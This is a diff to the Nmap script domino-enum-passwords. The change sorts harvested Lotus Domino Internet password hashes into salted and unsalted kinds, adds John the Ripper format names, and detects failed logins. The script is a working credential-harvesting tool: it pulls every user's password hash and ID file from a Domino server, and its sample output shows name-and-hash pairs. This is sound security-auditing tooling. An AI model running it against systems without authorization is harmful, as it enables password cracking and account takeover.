@@ -1,6 +1,6 @@
 description = [[
 Attempts to enumerate the hashed Domino Internet Passwords, that by default are accessible to all authenticated users.
-The script can also download any Domino ID Files attached to the Person document.
+The script can also download any Domino ID Files attached to the Person document. 
 ]]
 
 ---
@@ -10,7 +10,17 @@ The script can also download any Domino ID Files attached to the Person document
 -- This script attempts to enumerate the password hashes used to authenitcate
 -- to the Lotus Domino Web interface. By default, these hashes are accessible
 -- to every authenticated user. Passwords are presented in a form suitable for
--- running in John the Ripper. In addition the script can be used to download
+-- running in John the Ripper. 
+--
+-- The format can in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):
+-- 1. Saltless (legacy support?)
+-- Example: 355E98E7C7B59BD810ED845AD0FD2FC4
+-- John's format name: lotus5
+-- 2. Salted (also known as "More Secure Internet Password")
+-- Example: (GKjXibCW2Ml6juyQHUoP)
+-- John's format name: dominosec
+--
+-- In addition the script can be used to download
 -- any ID files attached to the Person document.
 --
 -- It appears as if form based authentication is enabled, basic authentication
@@ -24,7 +34,7 @@ The script can also download any Domino ID Files attached to the Person document
 -- | domino-enum-passwords:  
 -- |   Information
 -- |     Information retrieved as: "Jim Brass"
--- |   Internet hashes
+-- |   Internet hashes (salted, jtr: --format=DOMINOSEC)
 -- |      Jim Brass:(GYvlbOz2idzni5peJUdD)
 -- |      Warrick Brown:(GZghNctqAnJgyklUl2ml)
 -- |      Gill Grissom:(GyhsteeXTr75YOSwW8mc)
@@ -35,6 +45,9 @@ The script can also download any Domino ID Files attached to the Person document
 -- |      Wendy Simms:(G6wooaElHpsvA4TPvSfi)
 -- |      Nick Stokes:(Gdo2TJBRj1Ervrs9lPUp)
 -- |      Catherine Willows:(GlDc3QP5ePFR38d7lQeM)
+-- |   Internet hashes (unsalted, jtr: --format=lotus5)
+-- |      Ada Lovelace:355E98E7C7B59BD810ED845AD0FD2FC4
+-- |      John Smith:655E98E7C7B59BD810ED845AD0FD2FD4
 -- |   ID Files
 -- |      Jim Brass ID File has been downloaded (/tmp/id/Jim Brass.id)
 -- |      Warrick Brown ID File has been downloaded (/tmp/id/Warrick Brown.id)
@@ -61,6 +74,7 @@ The script can also download any Domino ID Files attached to the Person document
 -- Version 0.2
 -- Created 07/30/2010 - v0.1 - created by Patrik Karlsson <patrik@cqure.net>
 -- Revised 07/31/2010 - v0.2 - add support for downloading ID files
+-- Revised 11/25/2010 - v0.3 - added support for separating hash-type <martin@swende.se>
 
 author = "Patrik Karlsson"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
@@ -161,6 +175,8 @@ local function getUserDetails( body )
 	local dsp_http_passwd = body:match("<input name=\"dspHTTPPassword\".-value=\"(.-)\">")
 	local id_file = body:match("<a href=\"(.-UserID)\">")
 	
+	-- Remove the parenthesis around the password
+	http_passwd = http_passwd:sub(2,-2)
 	-- In case we have more than one full name, return only the last
 	full_name = stdnse.strsplit(";%s*", full_name)
 	full_name = full_name[#full_name]
@@ -196,11 +212,11 @@ action = function(host, port)
 	local user = nmap.registry.args['domino-enum-passwords.username']
 	local pass = nmap.registry.args['domino-enum-passwords.password']
 	local creds, pos, pager
-	local links, result, hashes, id_files = {}, {}, {}, {}
+	local links, result, hashes,legacyHashes, id_files = {}, {}, {}, {},{}
 	local chunk_size = 30
 	local max_fetch = nmap.registry.args['domino-enum-passwords.count'] and tonumber(nmap.registry.args['domino-enum-passwords.count']) or 10
 	local http_response
-		
+	
 	if ( nmap.registry['credentials'] and nmap.registry['credentials']['http'] ) then
 		creds = nmap.registry['credentials']['http']
 	end
@@ -226,7 +242,7 @@ action = function(host, port)
 			end
 		end
 	end
-
+	
 	if ( not(user) and not(pass) ) then
 		return "  \n  ERROR: No valid credentials were found (see domino-enum-passwords.username and domino-enum-passwords.password)"
 	end
@@ -235,7 +251,12 @@ action = function(host, port)
 	http_response = http.get( vhost or host, port, path, { auth = { username = user, password = pass }, no_cache = true })
 	pager = getPager( http_response.body )
 	if ( not(pager) ) then
-		return "  \n  ERROR: Failed to process results"
+		if ( http_response.body and 
+			 http_response.body:match(".*\<input type=\"submit\".* value=\"Sign In\"\>.*" ) ) then
+			return "  \n  ERROR: Failed to authenticate"
+		else
+			return "  \n  ERROR: Failed to process results"
+		end
 	end
 	pos = 1
 	
@@ -265,13 +286,18 @@ action = function(host, port)
 		http_response = http.get( vhost or host, port, link, { auth = { username = user, password = pass }, no_cache = true })	
 		local u_details = getUserDetails( http_response.body )
 
-		if ( max_fetch > 0 and #hashes >= max_fetch ) then
+		if ( max_fetch > 0 and (#hashes+#legacyHashes)>= max_fetch ) then
 			break
 		end
 
 		if ( u_details.fullname and u_details.passwd and #u_details.passwd > 0 ) then
-			stdnse.print_debug(2, "Found Internet has for: %s:%s", u_details.fullname, u_details.passwd)
-			table.insert( hashes, ("%s:%s"):format(u_details.fullname, u_details.passwd))
+			stdnse.print_debug(2, "Found Internet hash for: %s:%s", u_details.fullname, u_details.passwd)
+			-- Old type are 32 bytes, new are 20
+			if #u_details.passwd == 32 then
+				table.insert( legacyHashes, ("%s:%s"):format(u_details.fullname, u_details.passwd))
+			else
+				table.insert( hashes, ("%s:(%s)"):format(u_details.fullname, u_details.passwd))
+			end
 		end
 		
 		if ( u_details.idfile ) then
@@ -295,16 +321,23 @@ action = function(host, port)
 			end
 		end
 	end
-
-	if ( #hashes ) then
-		hashes.name = "Internet hashes"
-		table.insert( result, { name = "Information", [1] = ("Information retrieved as: \"%s\""):format(user) } )
-		table.insert( result, hashes )
 	
-		if ( #id_files ) then
-			id_files.name = "ID Files"
-			table.insert( result, id_files )
-		end
+	if( #hashes + #legacyHashes > 0) then
+		table.insert( result, { name = "Information", [1] = ("Information retrieved as: \"%s\""):format(user) } )
+	end
+	
+	if ( #hashes ) then
+		hashes.name = "Internet hashes (salted, jtr: --format=DOMINOSEC)"
+		table.insert( result, hashes )
+	end
+	if (#legacyHashes ) then
+		legacyHashes.name = "Internet hashes (unsalted, jtr: --format=lotus5)"
+		table.insert( result, legacyHashes )
+	end
+
+	if ( #id_files ) then
+		id_files.name = "ID Files"
+		table.insert( result, id_files )
 	end
 	
 	local result = stdnse.format_output(true, result)
